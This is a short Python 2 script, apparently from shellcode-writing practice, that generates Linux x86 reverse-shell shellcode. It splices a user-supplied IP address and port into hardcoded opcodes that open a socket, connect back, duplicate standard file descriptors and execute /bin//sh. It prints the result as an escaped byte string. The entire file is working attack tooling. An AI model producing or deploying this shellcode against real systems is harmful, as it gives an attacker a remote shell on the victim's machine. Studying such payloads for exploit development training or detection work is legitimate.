#!/usr/bin/python
# filename: rev-generator.py

import sys

try:


    shellcode_part_one = "31c031db31c931d266b86701b302b101cd809331c066b86a0189e5525268"
    
    ip_addr_array = sys.argv[1].split('.')
    ip_addr = ""
    for ip_part in ip_addr_array:
        fmt_ip_part = "{0:#0{1}x}".format(int(ip_part),4)
        if fmt_ip_part == "0x00":
            print "WARNING: Null bytes due to IP address"
        sub_ip_part = fmt_ip_part[2:4]
        ip_addr += sub_ip_part
    
    shellcode_part_two = "6668"

    port = "{0:#0{1}x}".format(int(sys.argv[2]),6) #e.g 4444 will be turned into '0x115c' or 12 to '0x000c'

    port_first_half = port[2:4]
    port_second_half = port[4:6]

    if port_first_half == "00" or port_second_half == "00":
        print "WARNING: Null bytes due to port number"

    shellcode_part_three = "666a0289e129e589eacd8031c931d2b10331c0b03f49cd8075f752682f2f7368682f62696e89e35289e25389e131c0b00bcd80" 

    shellcode = shellcode_part_one + ip_addr + shellcode_part_two + port_first_half + port_second_half + shellcode_part_three

    xformat_shellcode = "\\x" + "\\x".join(shellcode[n:n+2] for n in range(0, len(shellcode), 2))

    print "Reverse shellcode for target " + sys.argv[1] + ":" + sys.argv[2] + "\r\n" + xformat_shellcode
    


except:

    print "Usage: " + sys.argv[0] + " <IPADDR>" + " <PORT>"

